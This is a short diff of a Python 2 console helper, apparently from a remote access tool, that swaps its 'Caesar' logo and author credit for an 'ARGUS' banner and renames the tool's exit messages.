@@ -7,16 +7,21 @@ class Constants():
 
 def print_logo ():
     print """
-      .oooooo.
-     d8P'  `Y8b
-    888           .oooo.    .ooooo.   .oooo.o  .oooo.   oooo d8b
-    888          `P  )88b  d88' `88b d88(  "8 `P  )88b  `888""8P
-    888           .oP"888  888ooo888 `"Y88b.   .oP"888   888
-    `88b    ooo  d8(  888  888    .o o.  )88b d8(  888   888
-      `Y8bood8P' `Y888""8o `Y8bod8P' 8""888P' `Y888""8o d888b
+      
+     ▄▄▄       ██▀███    ▄████  █    ██   ██████ 
+    ▒████▄    ▓██ ▒ ██▒ ██▒ ▀█▒ ██  ▓██▒▒██    ▒ 
+    ▒██  ▀█▄  ▓██ ░▄█ ▒▒██░▄▄▄░▓██  ▒██░░ ▓██▄   
+    ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█  ██▓▓▓█  ░██░  ▒   ██▒
+     ▓█   ▓██▒░██▓ ▒██▒░▒▓███▀▒▒▒█████▓ ▒██████▒▒
+     ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
+      ▒   ▒▒ ░  ░▒ ░ ▒░  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░
+      ░   ▒     ░░   ░ ░ ░   ░  ░░░ ░ ░ ░  ░  ░  
+          ░  ░   ░           ░    ░           ░  
+                                             
 
-                           Coded by 0blio
-                (https://github.com/0blio/caesarRAT)
+
+                     WELCOME TO ARGUS
+                
     """
 
 def list_payloads (payloads):
@@ -32,7 +37,7 @@ def get_payload_value (message, n_payloads):
             else:
                 print '[!] Invalid index.'
         except KeyboardInterrupt:
-            print '\n[-] Caesar stopped.\n'
+            print '\n[-] Argus stopped.\n'
             sys.exit(0)
         except:
             print '[!] Invalid input.'
@@ -49,7 +54,7 @@ def get_non_empty_string (message, error):
             else:
                 break
         except KeyboardInterrupt:
-            print '\n[-] Caesar stopped.\n'
+            print '\n[-] Argus stopped.\n'
             sys.exit(0)
 
     return s
